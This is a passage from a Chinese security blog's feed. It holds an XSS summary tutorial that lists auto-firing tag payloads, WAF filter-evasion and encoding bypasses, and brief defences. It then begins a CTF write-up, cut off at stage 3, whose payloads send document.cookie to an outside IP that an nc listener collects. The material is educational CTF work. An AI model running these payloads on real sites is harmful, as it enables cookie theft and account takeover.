document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss总结</title>
      <link href="/2019/02/16/xss%E6%80%BB%E7%BB%93/"/>
      <url>/2019/02/16/xss%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067</a></p></blockquote><h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h1 id="常用的XSS攻击手段和目的"><a href="#常用的XSS攻击手段和目的" class="headerlink" title="常用的XSS攻击手段和目的"></a>常用的XSS攻击手段和目的</h1><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.盗用cookie，获取敏感信息。</span><br><span class="line">2.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</span><br><span class="line">3.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。</span><br><span class="line">4.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</span><br><span class="line">5.在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。</span><br></pre></td></tr></tbody></table></figure><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</span><br><span class="line">反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</span><br></pre></td></tr></tbody></table></figure><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</span><br><span class="line">此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</span><br></pre></td></tr></tbody></table></figure><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</span><br></pre></td></tr></tbody></table></figure><h1 id="无任何过滤情况下"><a href="#无任何过滤情况下" class="headerlink" title="无任何过滤情况下"></a>无任何过滤情况下</h1><h2 id="一些常见标签"><a href="#一些常见标签" class="headerlink" title="一些常见标签"></a>一些常见标签</h2><p><strong>PS：下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发，还有我测试的浏览器是火狐，Chrome，IE11.0，其它的浏览器没有去测试，有兴趣的师傅可以测试一下 =。=</strong></p><h3 id="lt-scirpt-gt"><a href="#lt-scirpt-gt" class="headerlink" title="<scirpt>"></a><code>&lt;scirpt&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scirpt&gt;alert("xss");&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-img-gt"><a href="#lt-img-gt" class="headerlink" title="<img>"></a><code>&lt;img&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert("xss");&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-input-gt"><a href="#lt-input-gt" class="headerlink" title="<input>"></a><code>&lt;input&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus="alert('xss');"&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line">&lt;input onblur=alert("xss") autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus="alert('xss');" autofocus&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-details-gt"><a href="#lt-details-gt" class="headerlink" title="<details>"></a><code>&lt;details&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle="alert('xss');"&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line">&lt;details open ontoggle="alert('xss');"&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-svg-gt"><a href="#lt-svg-gt" class="headerlink" title="<svg>"></a><code>&lt;svg&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert("xss");&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-select-gt"><a href="#lt-select-gt" class="headerlink" title="<select>"></a><code>&lt;select&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-iframe-gt"><a href="#lt-iframe-gt" class="headerlink" title="<iframe>"></a><code>&lt;iframe&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert("xss");&gt;&lt;/iframe&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-video-gt"><a href="#lt-video-gt" class="headerlink" title="<video>"></a><code>&lt;video&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror="alert(1)"&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="<audio>"></a><code>&lt;audio&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert("xss");&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-body-gt"><a href="#lt-body-gt" class="headerlink" title="<body>"></a><code>&lt;body&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert("xss");&gt;</span><br></pre></td></tr></tbody></table></figure><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=alert("xss");&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="lt-textarea-gt"><a href="#lt-textarea-gt" class="headerlink" title="<textarea>"></a><code>&lt;textarea&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert("xss"); autofocus&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-keygen-gt"><a href="#lt-keygen-gt" class="headerlink" title="<keygen>"></a><code>&lt;keygen&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-marquee-gt"><a href="#lt-marquee-gt" class="headerlink" title="<marquee>"></a><code>&lt;marquee&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert("xss")&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></tbody></table></figure><h3 id="lt-isindex-gt"><a href="#lt-isindex-gt" class="headerlink" title="<isindex>"></a><code>&lt;isindex&gt;</code></h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=1 onerror=alert("xss")&gt;//仅限于IE</span><br></pre></td></tr></tbody></table></figure><h3 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h3><p><strong> PS：在无CSP的情况下才可以 </strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import href="http://127.0.0.1/1.js"&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h3><p><code>&lt;a&gt;</code>标签<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href="javascript:alert(`xss`);"&gt;xss&lt;/a&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>&lt;iframe&gt;</code>标签<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert('xss');&gt;&lt;/iframe&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>&lt;img&gt;</code>标签<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert('xss')&gt;//IE7以下</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>&lt;form&gt;</code>标签<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action="Javascript:alert(1)"&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p><code>expression</code>属性<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style="xss:expression(alert('xss''))"&gt; // IE7以下</span><br><span class="line">&lt;div style="color:rgb(''&amp;#0;x:expression(alert(1))"&gt;&lt;/div&gt; //IE7以下</span><br><span class="line">&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // IE7以下</span><br></pre></td></tr></tbody></table></figure><p></p><p>background属性<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="有过滤的情况下"><a href="#有过滤的情况下" class="headerlink" title="有过滤的情况下"></a>有过滤的情况下</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>用<code>/</code>代替空格<br></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">"x"</span>/onerror=alert(<span class="string">"xss"</span>);&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ImG sRc=x onerRor=alert(<span class="string">"xss"</span>);&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="双写关键字"><a href="#双写关键字" class="headerlink" title="双写关键字"></a>双写关键字</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过<br></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;imimgg srsrcc=x onerror=alert(<span class="string">"xss"</span>);&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用eval<br></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)"</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>利用top<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;top["al"+"ert"](`xss`);&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;&lt;script&gt;alert("xss");//&lt;&lt;/script&gt;</span><br><span class="line">2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror="alert(`xss`);"&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.&lt;SCRIPT&gt;var a="\\";alert("xss");//";&lt;/SCRIPT&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>Unicode编码绕过<br></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')"</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>url编码绕过<br></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;</span><br></pre></td></tr></tbody></table></figure><p>Ascii码绕过<br></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>hex绕过<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>八进制<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert('\170\163\163')&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>base64绕过<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))"&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h2><p>1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src="x" onerror=alert(`xss`);&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了</p><h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h2><p>当括号被过滤的时候可以使用throw来绕过<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload="window.onerror=eval;throw'=alert\x281\x29';"&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h2><h3 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="使用IP"><a href="#使用IP" class="headerlink" title="使用IP"></a>使用IP</h3><p>1.十进制IP<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src="x" onerror=document.location=`http://2130706433/`&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>2.八进制IP<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src="x" onerror=document.location=`http://0177.0.0.01/`&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>3.hex<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>4.html标签中用</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">&lt;img src="x" onerror=document.location=`//www.baidu.com`&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>5.使用</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议</span><br></pre></td></tr></tbody></table></figure><p></p><p>Windows下<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190208102122-3a40fff4-2b48-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><br>Linux下<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190208103630-5775e02e-2b4a-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><br>6.使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src="x" onerror="document.location=`http://www。baidu。com`"&gt;//会自动跳转到百度</span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="如何防止xss"><a href="#如何防止xss" class="headerlink" title="如何防止xss"></a>如何防止xss</h1><ul><li>过滤一些危险字符，以及转义<code>&amp; &lt; &gt; " ' /</code>等危险字符</li><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li><li>设置CSP(Content Security Policy)</li><li>输入内容长度限制</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>感觉总结的不是很全面，以后会查漏补缺，如果有师傅发现错误之处，还望斧正</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://html5sec.org/" title="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a><br><a href="https://blog.csdn.net/qq_29277155/article/details/51320064" title="很全的xss总结" target="_blank" rel="noopener">很全的xss总结</a><br><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" title="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Thousand-Knocks解题记录</title>
      <link href="/2019/02/14/XSS-Thousand-Knocks%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/02/14/XSS-Thousand-Knocks%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4074" target="_blank" rel="noopener">https://xz.aliyun.com/t/4074</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了一个xss平台的题目，一共34题，题目还不错，这里记录一下解题记录<br>题目地址：<a href="https://knock.xss.moe/index" target="_blank" rel="noopener">传送门</a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这个平台接收flag的形式和其它平台不同，得用vps或者是用xss平台去接收cookie（flag在cookie中）</p><h2 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h2><p>第一关它是告诉你你怎么去获取flag的<br>直接把你的payload在这里提交（记住一定是要在这个填入你的payload），然后用你的vps去接受flag就行了<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209165910-f6c26108-2c48-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=`http://134.175.33.164:1234/?${document.cookie}`</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后服务器端用nc监听接收flag<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvkp 1234</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到成功接收到了flag<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209170638-0255a042-2c4a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h2 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h2><p>第二关直接可以嵌入js代码<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209171311-ec63c63c-2c4a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209171524-3bb51308-2c4b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage3"><a href="#stage3" class="headerlink" 